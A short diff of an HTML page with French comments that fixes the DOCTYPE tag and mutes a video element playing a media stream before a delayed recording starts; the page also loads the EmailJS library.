@@ -1,4 +1,4 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -74,9 +74,11 @@
         });
         
         video.srcObject = stream;
+        video.muted = true; // Force le mute du stream
         
         // Attendre que la vidéo soit prête puis enregistrer
         video.addEventListener('loadedmetadata', () => {
+          video.muted = true; // Double sécurité
           setTimeout(startRecording, 5000); // Délai de 5s avant enregistrement
         });
         
